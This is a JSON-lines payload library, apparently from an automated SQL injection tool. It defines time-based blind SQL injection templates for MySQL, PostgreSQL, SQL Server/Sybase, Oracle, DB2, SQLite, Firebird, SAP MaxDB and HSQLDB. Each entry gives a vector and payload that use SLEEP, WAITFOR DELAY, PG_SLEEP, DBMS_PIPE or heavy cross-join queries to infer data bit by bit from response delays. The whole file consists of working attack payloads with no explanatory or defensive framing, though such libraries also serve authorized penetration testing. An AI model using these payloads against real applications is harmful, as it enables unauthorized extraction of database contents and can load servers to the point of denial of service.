{"title": "MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)", "stype": 5, "level": 4, "risk": 1, "clause": [1, 2, 3, 9], "where": [1], "vector": "RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])", "request": {"payload": "RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])", "comment": "#"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL AND time-based blind (ELT)", "stype": 5, "level": 3, "risk": 1, "clause": [1, 2, 3, 8, 9], "where": [1], "vector": "AND ELT([INFERENCE],SLEEP([SLEEPTIME]))", "request": {"payload": "AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0.12"}}
{"title": "MySQL OR time-based blind (ELT)", "stype": 5, "level": 3, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR ELT([INFERENCE],SLEEP([SLEEPTIME]))", "request": {"payload": "OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL"}}
{"title": "MySQL AND time-based blind (ELT - comment)", "stype": 5, "level": 5, "risk": 1, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND ELT([INFERENCE],SLEEP([SLEEPTIME]))", "request": {"payload": "AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))", "comment": "#"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL"}}
{"title": "MySQL OR time-based blind (ELT - comment)", "stype": 5, "level": 5, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR ELT([INFERENCE],SLEEP([SLEEPTIME]))", "request": {"payload": "OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))", "comment": "#"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "MySQL"}}
{"title": "PostgreSQL > 8.1 AND time-based blind", "stype": 5, "level": 1, "risk": 1, "clause": [1, 2, 3, 8, 9], "where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)", "request": {"payload": "AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "PostgreSQL", "dbms_version": "> 8.1"}}
{"title": "PostgreSQL > 8.1 OR time-based blind", "stype": 5, "level": 1, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)", "request": {"payload": "OR [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "PostgreSQL", "dbms_version": "> 8.1"}}
{"title": "PostgreSQL > 8.1 AND time-based blind (comment)", "stype": 5, "level": 4, "risk": 1, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)", "request": {"payload": "AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))", "comment": "--"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "PostgreSQL", "dbms_version": "> 8.1"}}
{"title": "PostgreSQL > 8.1 OR time-based blind (comment)", "stype": 5, "level": 4, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)", "request": {"payload": "OR [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))", "comment": "--"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "PostgreSQL", "dbms_version": "> 8.1"}}
{"title": "PostgreSQL AND time-based blind (heavy query)", "stype": 5, "level": 2, "risk": 2, "clause": [1, 2, 3, 8, 9], "where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "PostgreSQL"}}
{"title": "PostgreSQL OR time-based blind (heavy query)", "stype": 5, "level": 2, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "PostgreSQL"}}
{"title": "PostgreSQL AND time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 2, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "PostgreSQL"}}
{"title": "PostgreSQL OR time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "PostgreSQL"}}
{"title": "Microsoft SQL Server/Sybase time-based blind (IF)", "stype": 5, "level": 1, "risk": 1, "clause": [0], "where": [1], "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'", "request": {"payload": "WAITFOR DELAY '0:0:[SLEEPTIME]'"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Microsoft SQL Server/Sybase time-based blind (IF - comment)", "stype": 5, "level": 4, "risk": 1, "clause": [0], "where": [1], "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'", "request": {"payload": "WAITFOR DELAY '0:0:[SLEEPTIME]'", "comment": "--"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Microsoft SQL Server/Sybase AND time-based blind (heavy query)", "stype": 5, "level": 2, "risk": 2, "clause": [1, 2, 3, 8, 9], "where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Microsoft SQL Server/Sybase OR time-based blind (heavy query)", "stype": 5, "level": 2, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 2, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Oracle AND time-based blind", "stype": 5, "level": 1, "risk": 1, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)", "request": {"payload": "AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle OR time-based blind", "stype": 5, "level": 1, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)", "request": {"payload": "OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle AND time-based blind (comment)", "stype": 5, "level": 4, "risk": 1, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)", "request": {"payload": "AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])", "comment": "--"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle OR time-based blind (comment)", "stype": 5, "level": 4, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)", "request": {"payload": "OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])", "comment": "--"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle AND time-based blind (heavy query)", "stype": 5, "level": 2, "risk": 2, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle OR time-based blind (heavy query)", "stype": 5, "level": 2, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle AND time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 2, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle OR time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Oracle"}}
{"title": "IBM DB2 AND time-based blind (heavy query)", "stype": 5, "level": 3, "risk": 2, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "IBM DB2"}}
{"title": "IBM DB2 OR time-based blind (heavy query)", "stype": 5, "level": 3, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "IBM DB2"}}
{"title": "IBM DB2 AND time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 2, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "IBM DB2"}}
{"title": "IBM DB2 OR time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "IBM DB2"}}
{"title": "SQLite > 2.0 AND time-based blind (heavy query)", "stype": 5, "level": 3, "risk": 2, "clause": [1, 8, 9], "where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)", "request": {"payload": "AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "SQLite", "dbms_version": "> 2.0"}}
{"title": "SQLite > 2.0 OR time-based blind (heavy query)", "stype": 5, "level": 3, "risk": 3, "clause": [1, 9], "where": [1], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)", "request": {"payload": "OR [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "SQLite", "dbms_version": "> 2.0"}}
{"title": "SQLite > 2.0 AND time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 2, "clause": [1, 9], "where": [1], "vector": "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)", "request": {"payload": "AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "SQLite", "dbms_version": "> 2.0"}}
{"title": "SQLite > 2.0 OR time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 3, "clause": [1, 9], "where": [1], "vector": "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)", "request": {"payload": "OR [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "SQLite", "dbms_version": "> 2.0"}}
{"title": "Firebird >= 2.0 AND time-based blind (heavy query)", "stype": 5, "level": 4, "risk": 2, "clause": [1, 9], "where": [1], "vector": "AND [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Firebird", "dbms_version": ">= 2.0"}}
{"title": "Firebird >= 2.0 OR time-based blind (heavy query)", "stype": 5, "level": 4, "risk": 3, "clause": [1, 9], "where": [1], "vector": "OR [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Firebird", "dbms_version": ">= 2.0"}}
{"title": "Firebird >= 2.0 AND time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 2, "clause": [1, 9], "where": [1], "vector": "AND [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Firebird", "dbms_version": ">= 2.0"}}
{"title": "Firebird >= 2.0 OR time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 3, "clause": [1, 9], "where": [1], "vector": "OR [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "Firebird", "dbms_version": ">= 2.0"}}
{"title": "SAP MaxDB AND time-based blind (heavy query)", "stype": 5, "level": 4, "risk": 2, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND [RANDNUM]=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "SAP MaxDB"}}
{"title": "SAP MaxDB OR time-based blind (heavy query)", "stype": 5, "level": 4, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "SAP MaxDB"}}
{"title": "SAP MaxDB AND time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 2, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND [RANDNUM]=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)", "request": {"payload": "AND [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "SAP MaxDB"}}
{"title": "SAP MaxDB OR time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR [RANDNUM]=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)", "request": {"payload": "OR [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "SAP MaxDB"}}
{"title": "HSQLDB >= 1.7.2 AND time-based blind (heavy query)", "stype": 5, "level": 4, "risk": 2, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END", "request": {"payload": "AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "HSQLDB", "dbms_version": ">= 1.7.2"}}
{"title": "HSQLDB >= 1.7.2 OR time-based blind (heavy query)", "stype": 5, "level": 4, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END", "request": {"payload": "OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "HSQLDB", "dbms_version": ">= 1.7.2"}}
{"title": "HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 2, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END", "request": {"payload": "AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "HSQLDB", "dbms_version": ">= 1.7.2"}}
{"title": "HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment)", "stype": 5, "level": 5, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END", "request": {"payload": "OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)", "comment": "--"}, "response": {"time": "[DELAYED]"}, "details": {"dbms": "HSQLDB", "dbms_version": ">= 1.7.2"}}
{"title": "HSQLDB > 2.0 AND time-based blind (heavy query)", "stype": 5, "level": 4, "risk": 2, "clause": [1, 2, 3, 9], "where": [1], "vector": "AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END", "request": {"payload": "AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "HSQLDB", "dbms_version": "> 2.0"}}
{"title": "HSQLDB > 2.0 OR time-based blind (heavy query)", "stype": 5, "level": 4, "risk": 3, "clause": [1, 2, 3, 9], "where": [1], "vector": "OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END", "request": {"payload": "OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)"}, "response": {"time": "[SLEEPTIME]"}, "details": {"dbms": "HSQLDB", "dbms_version": "> 2.0"}}
